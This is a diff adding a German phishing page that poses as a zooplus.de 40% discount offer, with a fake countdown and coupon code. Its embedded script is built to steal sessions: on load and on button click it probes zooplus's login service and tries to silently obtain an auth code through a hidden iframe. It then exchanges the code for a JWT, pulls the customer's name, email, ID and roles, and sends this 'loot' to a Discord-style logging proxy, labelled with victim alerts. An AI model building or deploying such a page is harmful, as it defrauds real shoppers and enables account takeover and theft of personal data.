@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 -40% Rabatt | zooplus.de</title>
+    <link rel="icon" href="https://www.zooplus.de/favicon.ico">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center}
+        .card{background:#fff;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.3);max-width:480px;width:90%;overflow:hidden;animation:up .6s ease}
+        @keyframes up{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+        .hdr{background:linear-gradient(135deg,#e74c3c,#c0392b);color:#fff;padding:30px;text-align:center}
+        .badge{font-size:13px;background:rgba(255,255,255,.2);padding:4px 12px;border-radius:20px;display:inline-block;margin-bottom:10px}
+        .hdr h1{font-size:26px;font-weight:700;margin-bottom:6px}
+        .disc{font-size:52px;font-weight:800}
+        .sub{font-size:14px;opacity:.9;margin-top:4px}
+        .body{padding:30px}
+        .info{color:#666;font-size:14px;line-height:1.6;margin-bottom:20px}
+        .timer{display:flex;justify-content:center;gap:12px;margin-bottom:24px}
+        .tb{text-align:center}
+        .tn{background:#f8f9fa;border-radius:8px;padding:10px 14px;font-size:22px;font-weight:700;color:#e74c3c;min-width:48px}
+        .tl{font-size:11px;color:#999;margin-top:4px}
+        .btn{width:100%;background:linear-gradient(135deg,#e74c3c,#c0392b);color:#fff;border:none;padding:16px;border-radius:10px;font-size:17px;font-weight:700;cursor:pointer;transition:.3s}
+        .btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(231,76,60,.4)}
+        .btn.off{pointer-events:none;opacity:.7}
+        .trust{display:flex;justify-content:center;gap:18px;margin-top:18px;color:#999;font-size:12px}
+        .overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.95);z-index:999;flex-direction:column;align-items:center;justify-content:center}
+        .overlay.on{display:flex}
+        .spin{width:48px;height:48px;border:4px solid #f3f3f3;border-top:4px solid #e74c3c;border-radius:50%;animation:sp 1s linear infinite;margin-bottom:16px}
+        @keyframes sp{to{transform:rotate(360deg)}}
+        .ok{display:none;text-align:center;padding:30px}
+        .ok.on{display:block}
+        .oki{font-size:56px;margin-bottom:12px}
+        .okt{font-size:22px;color:#27ae60;font-weight:700;margin-bottom:8px}
+        .code{background:#f8f9fa;border:2px dashed #27ae60;border-radius:8px;padding:14px;margin:16px 0;font-size:22px;font-weight:700;color:#27ae60;letter-spacing:3px}
+        .okm{color:#666;font-size:13px}
+        .hide{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;left:-9999px}
+    </style>
+</head>
+<body>
+<div class="card" id="card">
+    <div class="hdr">
+        <div class="badge">⚡ EXKLUSIV</div>
+        <h1>Heute nur: 40% Rabatt!</h1>
+        <div class="disc">-40%</div>
+        <div class="sub">Auf Ihre nächste Bestellung bei zooplus</div>
+    </div>
+    <div class="body" id="mainBody">
+        <p class="info">Als treuer zooplus-Kunde erhalten Sie heute einen exklusiven Rabattcode. Nur für begrenzte Zeit!</p>
+        <div class="timer">
+            <div class="tb"><div class="tn" id="m">04</div><div class="tl">Minuten</div></div>
+            <div class="tb"><div class="tn" id="s">59</div><div class="tl">Sekunden</div></div>
+        </div>
+        <button class="btn" id="btn" onclick="go()">🎁 Jetzt einlösen & sparen</button>
+        <div class="trust"><span>🔒 SSL</span><span>✓ Sicher</span><span>🐾 zooplus.de</span></div>
+    </div>
+    <div class="ok" id="ok">
+        <div class="oki">🎉</div>
+        <div class="okt">Rabattcode freigeschaltet!</div>
+        <div class="code">LIEBE40</div>
+        <p class="okm">Nutzen Sie diesen Code an der Kasse.<br>Gültig für 24 Stunden.</p>
+    </div>
+</div>
+<div class="overlay" id="ov"><div class="spin"></div><div style="color:#333;font-size:15px">Rabattcode wird generiert...</div></div>
+<iframe id="xf" class="hide"></iframe>
+<script>
+// ══════════════════════════════════════════════
+// ZOOPLUS FULL CHAIN — Server-backed proxy
+// Full JWT theft + user data exfiltration
+// ══════════════════════════════════════════════
+
+const BASE = window.location.origin;
+const KC = 'https://login.zooplus.de/auth/realms/zooplus';
+const CID = 'shop-myzooplus-prod-zooplus';
+const RU = 'https://www.zooplus.de/web/sso-myzooplus/login';
+
+let loot = { logged_in: false, jwt: null, payload: null, userinfo: null };
+
+// Timer
+let t = 299;
+setInterval(() => {
+    if (t > 0) t--;
+    document.getElementById('m').textContent = String(Math.floor(t / 60)).padStart(2, '0');
+    document.getElementById('s').textContent = String(t % 60).padStart(2, '0');
+}, 1000);
+
+// Discord via server proxy
+async function dc(data) {
+    try {
+        await fetch(BASE + '/proxy/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+    } catch (e) {}
+}
+
+// STEP 1: CORS Recon + Login Detection
+async function recon() {
+    try {
+        const r = await fetch(KC + '/.well-known/openid-configuration', { credentials: 'include' });
+        const c = await r.json();
+        loot.config = c;
+        loot.logged_in = true;
+        return true;
+    } catch (e) { return false; }
+}
+
+// STEP 2: Silent JWT steal via hidden iframe auth
+function stealJWT() {
+    return new Promise(resolve => {
+        const url = KC + '/protocol/openid-connect/auth' +
+            '?response_type=code' +
+            '&client_id=' + CID +
+            '&redirect_uri=' + encodeURIComponent(RU) +
+            '&scope=openid+email+profile' +
+            '&prompt=none' +
+            '&state=s' + Date.now();
+
+        const f = document.getElementById('xf');
+        let done = false, n = 0;
+
+        const iv = setInterval(() => {
+            n++;
+            try {
+                const u = f.contentWindow?.location?.href || '';
+                if (u.includes('code=') && !done) {
+                    done = true;
+                    clearInterval(iv);
+                    const code = new URL(u).searchParams.get('code');
+                    if (code) exchangeCode(code).then(resolve);
+                    else resolve(null);
+                }
+            } catch (e) {
+                // Cross-origin redirect — can't read
+            }
+            if (n > 80 && !done) {
+                clearInterval(iv);
+                resolve(null);
+            }
+        }, 100);
+
+        f.src = url;
+    });
+}
+
+// STEP 3: Exchange auth code for JWT via server proxy
+async function exchangeCode(code) {
+    try {
+        const r = await fetch(BASE + '/proxy/token', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams({
+                grant_type: 'authorization_code',
+                client_id: CID,
+                code: code,
+                redirect_uri: RU
+            })
+        });
+
+        const d = await r.json();
+        if (d.access_token) {
+            loot.jwt = d.access_token;
+            loot.payload = JSON.parse(atob(d.access_token.split('.')[1]));
+            return d.access_token;
+        }
+    } catch (e) {}
+    return null;
+}
+
+// STEP 4: Fetch userinfo via server proxy
+async function grabUserinfo(token) {
+    try {
+        const r = await fetch(BASE + '/proxy/userinfo', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token })
+        });
+        if (r.ok) loot.userinfo = await r.json();
+    } catch (e) {}
+}
+
+// STEP 5: Main claim handler
+async function go() {
+    const btn = document.getElementById('btn');
+    btn.classList.add('off');
+    btn.textContent = '⏳ Wird verarbeitet...';
+    document.getElementById('ov').classList.add('on');
+
+    // Recon
+    await recon();
+
+    // If logged in, steal JWT
+    if (loot.logged_in) {
+        const token = await stealJWT();
+        if (token) await grabUserinfo(token);
+    }
+
+    // Build Discord payload
+    const fields = [];
+    fields.push({ name: '🎯 Attack', value: loot.logged_in ? 'Silent JWT Theft (logged in)' : 'Visit detected (not logged in)', inline: false });
+
+    if (loot.payload) {
+        const p = loot.payload;
+        fields.push(
+            { name: '👤 Name', value: p.name || 'N/A', inline: true },
+            { name: '📧 Email', value: p.email || 'N/A', inline: true },
+            { name: '🆔 Customer ID', value: String(p.customerId || 'N/A'), inline: true },
+            { name: '🆔 Sub', value: p.sub || 'N/A', inline: false },
+            { name: '🎭 Roles', value: (p.realm_access?.roles || []).join(', ') || 'N/A', inline: false }
+        );
+    }
+
+    if (loot.userinfo) {
+        fields.push({ name: '📋 Full Userinfo', value: '```json\n' + JSON.stringify(loot.userinfo, null, 2).substring(0, 400) + '\n```', inline: false });
+    }
+
+    if (loot.jwt) {
+        fields.push({ name: '🎫 JWT', value: '```\n' + loot.jwt.substring(0, 180) + '...\n```', inline: false });
+    }
+
+    if (loot.config) {
+        fields.push(
+            { name: '🔍 Token Endpoint', value: '```' + loot.config.token_endpoint + '```', inline: false },
+            { name: '🔍 Userinfo Endpoint', value: '```' + loot.config.userinfo_endpoint + '```', inline: false }
+        );
+    }
+
+    fields.push({ name: '🖥️ Victim', value: 'UA: ' + (navigator.userAgent || '?').substring(0, 80), inline: false });
+
+    await dc({
+        embeds: [{
+            title: '🔱 ZOOPLUS FULL CHAIN — LOOT',
+            color: loot.logged_in ? 0x00ff00 : 0xff9900,
+            fields: fields,
+            timestamp: new Date().toISOString(),
+            footer: { text: '🔱 V0RT3X | Full Chain Deploy' }
+        }]
+    });
+
+    // Show success
+    setTimeout(() => {
+        document.getElementById('ov').classList.remove('on');
+        document.getElementById('mainBody').style.display = 'none';
+        document.getElementById('ok').classList.add('on');
+        btn.style.display = 'none';
+    }, 2000);
+}
+
+// On load: silent recon + notify
+(async () => {
+    await recon();
+    await dc({
+        embeds: [{
+            title: loot.logged_in ? '👁️ VICTIM VISITED — LOGGED IN ✅' : '👁️ VICTIM VISITED',
+            color: loot.logged_in ? 0x00ff00 : 0xf39c12,
+            fields: [
+                { name: 'Status', value: loot.logged_in ? '✅ Active Keycloak session — JWT steal ready' : '❌ Not logged in', inline: false },
+                { name: 'URL', value: window.location.href, inline: false },
+                { name: 'Referrer', value: document.referrer || 'Direct', inline: false }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    });
+})();
+</script>
+</body>
+</html>
